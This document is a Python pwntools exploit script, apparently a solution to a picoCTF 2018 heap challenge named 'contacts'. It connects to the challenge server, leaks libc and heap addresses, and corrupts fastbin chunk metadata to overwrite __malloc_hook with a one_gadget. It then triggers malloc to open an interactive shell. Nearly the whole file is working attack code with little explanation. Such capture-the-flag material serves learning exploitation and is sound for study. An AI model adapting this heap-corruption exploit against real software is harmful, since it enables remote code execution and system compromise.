from pwn import *
from struct import *



debug = 0
if not debug:
    sh = remote("2018shell4.picoctf.com", 9850)
else:
    sh = process('./contacts')




e = ELF('./contacts')
LIBC = ('./libc.so.6')
def create_contact(s):
    sh.sendafter('> ', 'create ' + s + '\n')
def delete_contact(s):
    sh.sendafter('> ', 'delete ' + s + '\n')

def set_bio(s, length, bio):
    sh.sendafter('> ', 'bio ' + s + '\n')
    sh.sendafter('How long will the bio be?', str(length) + '\n')
    sh.sendafter('Enter your new bio:', bio + '\n')

def print_contacts():
    sh.sendafter('> ', 'display' + '\n')

def leak_address(s, name1, name2):
    create_contact(s)
    length = 16
    bio = "hello_world"
    set_bio(s, length,  bio)
    delete_contact(s)
    create_contact(name1)
    create_contact(name2)
    print_contacts()


'''
----------------------------------------------------------------------------------------
offsets
'''
libc = ELF(LIBC)
contacts_addr = 0x6020c0
malloc_offset = libc.symbols['malloc']
hook_offset = libc.symbols['__malloc_hook']
print 'hook_offset = ', hex(hook_offset)
malloc_got = e.got['malloc']
print 'malloc_got = ', hex(malloc_got)
print 'malloc_offset = ', hex(malloc_offset)
'''
------------------------------------------------------------------------------------------
'''



'''
--------------------------------------------------------------------------------------------------
leak libc address
'''
s = "A"*8
s += struct.pack('Q', malloc_got)
create_contact(s)
delete_contact(s)
create_contact('A'*0x20)
create_contact('libc')
print_contacts()
sh.recvuntil('libc - ')
libc_addr = u64((sh.recvuntil('\n').split('\n')[0])[:6].ljust(8, '\x00'))
libc_base = libc_addr - malloc_offset
print '-'*79
print 'libc_base = ', hex(libc_base)
print '-'*79

malloc_hook = libc_base + hook_offset
print '-'*79
print 'malloc_hook = ', hex(malloc_hook) 
print '-'*79
'''
---------------------------------------------------------------------------------------------------
'''

'''
--------------------------------------------------------------------------------------------------
leak heap address
'''
bio = p64(0x0) + p64(contacts_addr)
set_bio('A'*0x20, 0x10, bio)
delete_contact('A'*0x20)
create_contact('A'*0x20)
create_contact('heap')
print_contacts()
sh.recvuntil('heap - ')
heap_addr = u64((sh.recvuntil('\n').split('\n')[0])[:6].ljust(8, '\x00'))

print '-'*75
print 'heap address = ', hex(heap_addr)
print '-'*75
pause()

'''
---------------------------------------------------------------------------------------------------
'''

one_gadget = libc_base + 0x4526a

log.info('using arbitrary free to everlap a free fastbin chunk so that we can corrupt the chunks meta data.')
target = heap_addr + 0xE0
create_contact('A'*8 + p64(0x51))
set_bio('A'*8 + p64(0x51), 0x60, p64(0x0)*7 + p64(0x21))
set_bio('A'*0x20, 0x10, p64(0x0) +  p64(target))
delete_contact('A'*0x20)
create_contact('A'*0x20)
create_contact('overlap')
delete_contact('A'*8 + p64(0x51))
delete_contact('overlap')
log.info('use fastbin corruption to overwrite __malloc_hook with a magic gadget')
create_contact('first')
create_contact('second')
create_contact('hacker')


set_bio('hacker', 0x40, p64(0x0) + p64(0x71) + p64(malloc_hook - 0x23))
create_contact('A'*0x60)
set_bio('A'*0x60, 0x60, '\x00'*0x13 + p64(one_gadget))
log.info('call malloc and get a shell.')

create_contact('mr.robot')
sh.interactive()

    
    
    
    
    
